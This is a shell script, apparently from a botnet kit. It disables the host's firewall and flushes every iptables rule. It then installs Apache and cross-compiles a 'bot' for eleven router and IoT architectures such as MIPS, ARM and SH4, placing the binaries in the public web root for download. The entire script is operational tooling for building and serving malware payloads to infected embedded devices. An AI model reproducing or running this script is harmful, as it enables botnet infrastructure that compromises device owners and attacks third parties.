ufw disable
cd bot
apt upgrade
apt update -y

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -P FORWARD ACCEPT


#setup http server if not installed
       
apt-get install apache2 -y

service apache2 start

# install ubuntu cross compilers (not recommended)
apt install gcc-powerpc64-linux-gnu -y
apt install gcc-mips-linux-gnu -y
apt install gcc-mipsel-linux-gnu -y
apt install gcc-sparc64-linux-gnu -y
apt install gcc-arm-linux-gnueabi -y
apt install gcc-aarch64-linux-gnu -y
apt install gcc-m68k-linux-gnu -y
apt install gcc-i686-linux-gnu -y
apt install gcc-arm-linux-gnueabihf -y
apt install gcc-sh4-linux-gnu -y

powerpc64-linux-gnu-gcc -static -pthread -DARCH_powerpc64 *.c -o powerpc64  
mips-linux-gnu-gcc -static -pthread -DARCH_mips *.c -o mips  
mipsel-linux-gnu-gcc -static -pthread -DARCH_mipsel *.c -o mipsel  
sparc64-linux-gnu-gcc -static -pthread -DARCH_sparc *.c -o sparc  
arm-linux-gnueabi-gcc -static -pthread -DARCH_arm *.c -o arm  
aarch64-linux-gnu-gcc -static -pthread -DARCH_aarch64 *.c -o aarch64  
m68k-linux-gnu-gcc -static -pthread -DARCH_m68k *.c -o m68k  
i686-linux-gnu-gcc -static -pthread -DARCH_i686 *.c -o i686  
arm-linux-gnueabihf-gcc -static -pthread -DARCH_arm *.c -o armhf  
x86_64-linux-gnu-gcc -static -pthread -DARCH_x86_64 *.c -o x86_64  
sh4-linux-gnu-gcc -static -pthread -DARCH_sh4 *.c -o sh4  

#move binaries to apache2 dir
mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html

cd ..
echo "DONE COMPILING BOT, BINS IN /var/www/html"
echo "THIS COMPILER IS NOT RECOMMENDED"
exit 0